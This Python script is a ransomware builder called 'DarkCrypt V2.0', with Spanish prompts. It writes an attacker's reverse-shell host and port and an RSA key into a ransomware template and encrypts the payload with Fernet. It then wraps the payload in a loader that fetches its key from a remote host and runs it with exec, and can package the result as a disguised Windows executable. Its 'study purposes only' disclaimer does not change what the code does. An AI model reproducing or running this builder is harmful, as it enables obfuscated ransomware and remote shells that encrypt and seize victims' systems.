#!/usr/bin/env python3
import re
from pystyle import Colorate, Colors # type: ignore
from colorama import Fore, init # type: ignore
import os
import sys
import time
import base64
from cryptography.fernet import Fernet # type: ignore
from PIL import Image # type: ignore


init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')

def log_txt(txt):
    print(Fore.BLUE+'[!] ', end='')
    for lts in txt:
        print(lts, end='')
        time.sleep(0.05)

def upload_key(key):
    with open('index.html', 'w') as ukey:
        ukey.write(key.decode())

def extracting_publickey():
    try:
        file_ = 'public_key.pem'
        with open(file_, 'rb') as pb_key:
            public_key = pb_key.read()
    except FileNotFoundError:
        print(Fore.BLUE+'[!]'+Fore.WHITE+f' Ocurrio un error al intentar leer la clave publica, asegurate de que el archivo {file_}\nEste en el mismo directorio o que exista')
        sys.exit()

    return public_key.decode('utf-8')

def modify(file_path, desc, remote_access_host, remote_access_port, hv, host, key):
    try:
        # Leer las lineas del archivo fuente
        with open(file_path, 'r') as file:
            lines = file.readlines()
        updated_lines = []
        # Patrones para identificar las lineas a modificar
        user_pattern = re.compile(r"^\s*Desc\s*=\s*['\"](.*)['\"]\s*$")
        host_pattern = re.compile(r'^\s*HOST\s*=\s*.*$')
        port_pattern = re.compile(r'^\s*PORT\s*=\s*.*$')
        host_validation = re.compile(r'^\s*host_validation\s*=\s*.*$')
        host_key = re.compile(r'^\s*host\s*=\s*.*$')
        public_key = re.compile(r'^\s*public_key_pem\s*=\s*.*$')

        for line in lines:
            if user_pattern.match(line):
                txt = 'Subiendo descripcion...\n'
                log_txt(txt)
                time.sleep(3)
                updated_lines.append(f"Desc = '{desc}'\n")
            
            elif host_pattern.match(line):
                txt2 = 'Editando el HOST...\n'
                log_txt(txt2)
                time.sleep(3)
                updated_lines.append(f"HOST = '{remote_access_host}'\n")
            
            elif port_pattern.match(line):
                txt3 = 'Editando el PORT...\n'
                log_txt(txt3)
                time.sleep(3)                
                updated_lines.append(f"PORT = '{remote_access_port}'\n")
            
            elif host_validation.match(line):
                txt4 = f'Agregando la validacion de host en {hv}\n'
                log_txt(txt4)
                time.sleep(3)
                updated_lines.append(f'host_validation = {hv}\n')

            elif host_key.match(line):
                txt5 = 'Agregando el host para enviar la clave\n'
                log_txt(txt5)
                time.sleep(3)
                updated_lines.append(f'host = "{host}"\n')

            elif public_key.match(line):
                txt6 = 'Agregando clave publica RSA...\n'
                rsa_pukey = extracting_publickey()
                log_txt(txt6)
                time.sleep(2)
                updated_lines.append(f'public_key_pem = b"""{rsa_pukey}"""')
            else:
                updated_lines.append(line)
        gkey = 'Subiendo la clave Fernet...\n'
        log_txt(gkey)
        time.sleep(2)
        e = Fernet(key)
        encoded_lines = [line.encode() for line in updated_lines]
        encrypted_data = e.encrypt(b''.join(encoded_lines))
        edited_code = f'''import base64
from cryptography.fernet import Fernet
from tkinter import simpledialog
import base64
import requests

code = {encrypted_data}
host = "{host}"
r = requests.get(host)
key = r.content
decoder = Fernet(key).decrypt(code)
exec(decoder.decode())'''
            

        # Escribir las lineas actualizadas
        with open('edited_ransom.py', 'w') as file:
            file.writelines(edited_code)

    except KeyboardInterrupt as e:
        print(f"Error al manejar los archivos: {e}")


try:
    def main():
        banner = '''
    8888b.     db    88""Yb 88  dP  dP""b8 88""Yb Yb  dP 88""Yb 888888
     8I  Yb   dPYb   88__dP 88odP  dP   `" 88__dP  YbdP  88__dP   88
     8I  dY  dP__Yb  88"Yb  88"Yb  Yb      88"Yb    8P   88"""    88
    8888Y"  dP""""Yb 88  Yb 88  Yb  YboodP 88  Yb  dP    88       88
                        Created by: 74lg0
                        Version => DarkCrypt V2.0
                      Windows Ransomware Fake ;)
    '''
        print(Colorate.Horizontal(Colors.green_to_blue, banner))
        print(Fore.RED + "[!] I do not take responsibility for misuse, this ransomware was created for study purposes only.\n[!] I do not control their actions.\n")
        file = int(input(Colorate.Horizontal(Colors.rainbow, '[1] Reverse Shell Ransomware\n[2] Ransomware\n=> ')))
        desc = input(Fore.YELLOW + "Descripcion => ")
        name = input('Name for app => ')
        icon = input('Icon for app optional (.png) => ')
        if icon.endswith('.ico'):
            pass
 
        elif icon == '':
            pass

        else:
            try:
                converter_icon = Image.open(icon)
                converter_icon.save('icon.ico', format='ICO')
            except FileNotFoundError:
                print(f'No se encontro el archivo {icon}')

        if file == 1:
            file_path = 'RansomCrypt.py'
            remote_access_host = input('Your remote access host => ')
            remote_access_port = int(input('Your remote access port => '))
            host_v = input('Deseas validar un host (Y/N) => ')
            if host_v.lower() == 'y':
                host = input('Host para enviar la clave => ')
                key = Fernet.generate_key()
                upload_key(key)
                os.system('cls' if os.name == 'nt' else 'clear')
                host_v = True
                modify(file_path, desc, remote_access_host, remote_access_port, host_v, host, key)
            
            elif host_v.lower() == 'n':
                key = Fernet.generate_key()
                upload_key(key)
                os.system('cls' if os.name == 'nt' else 'clear')
                modify(file_path, desc, remote_access_host, remote_access_port, False, None, key)

        elif file == 2:
            file_path = 'Ransom.py'
            host_v = input('Deseas validar un host (Y/N) => ')
            if host_v.lower() == 'y':
                host = input('Host para enviar la clave => ')
                key = Fernet.generate_key()
                upload_key(key)
                os.system('cls' if os.name == 'nt' else 'clear')
                host_v = True
                modify(file_path, desc, None, None, host_v, host, key)
            
            elif host_v.lower() == 'n':
                key = Fernet.generate_key()
                upload_key(key)
                os.system('cls' if os.name == 'nt' else 'clear')
                modify(file_path, desc, None, None, None, False, key)
            
            else:
                print(f'{host_v} no es una opcion valida')

        else:
            print(f'{file} no es una opcion valida')
            sys.exit()

        ejecutable = input(Fore.GREEN+'Deseas crear el ejecutable (.EXE) Y/N\n=> ')
        if ejecutable.lower() == 'y':
            if icon == '':
                command = f'pyinstaller --noconfirm --onefile --windowed --name "{name}" "edited_ransom.py"'
                os.system(command)
            else:
                command = f'pyinstaller --noconfirm --onefile --windowed --icon "icon.ico" --name "{name}" "edited_ransom.py"'
                os.system(command)
        elif ejecutable.lower() == 'n':
            print(Fore.YELLOW+"Entendido, que tengas un excelente dia")
            sys.exit()

except KeyboardInterrupt:
        sys.exit()

except ValueError:
    print(Colorate.Horizontal(Colors.green_to_blue, 'Elije una opcion...'))
    
except Exception as e:
    print(Colorate.Horizontal(Colors.red_to_blue, f'ERROR {e}'))

if __name__ == "__main__":
    main()
